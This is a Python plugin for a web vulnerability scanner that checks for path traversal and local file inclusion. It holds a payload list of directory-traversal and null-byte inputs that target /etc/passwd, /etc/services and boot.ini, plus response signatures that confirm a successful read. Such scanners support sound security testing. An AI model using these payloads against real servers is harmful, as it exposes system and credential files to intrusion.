from cores.base_plugins import Scanner

class Check(Scanner):
	def gen_payload(self):
		return [
			"/etc/passwd",
			"/etc/passwd\0",
			"c:\\boot.ini",
			"c:\\boot.ini\0",
			"../../../../../../../../../../etc/passwd",
			"../../../../../../../../../../../../../../../../../../../../etc/passwd",
			"../../../../../../../../../../etc/passwd\0",
			"../../../../../../../../../../../../../../../../../../../../etc/services\0",
			"../../../../../../../../../../boot.ini",
			"../../../../../../../../../../../../../../../../../../../../boot.ini",
			"../../../../../../../../../../boot.ini\0",
		]

	def signature(self):
		return {
			"*nix System": [
				"root:x:0:0",
				"root:*:0:0",
			],
			"Windows System": [
				"[boot loader]",
			],
			"File Includsion": [
				"java.io.FileNotFoundException:",
				"fread(): supplied argument is not",
				"fpassthru(): supplied argument is not",
				"for inclusion (include_path=",
				"Failed opening required",
				"Warning: file(", "file()",
				"<b>Warning</b>:  file(",
				"Warning: readfile(",
				"<b>Warning:</b>  readfile(",
				"Warning: file_get_contents(",
				"<b>Warning</b>:  file_get_contents(",
				"Warning: show_source(",
				"<b>Warning:</b>  show_source(",
				"Warning: highlight_file(",
				"<b>Warning:</b>  highlight_file(",
				"System.IO.FileNotFoundException:",
			]
		}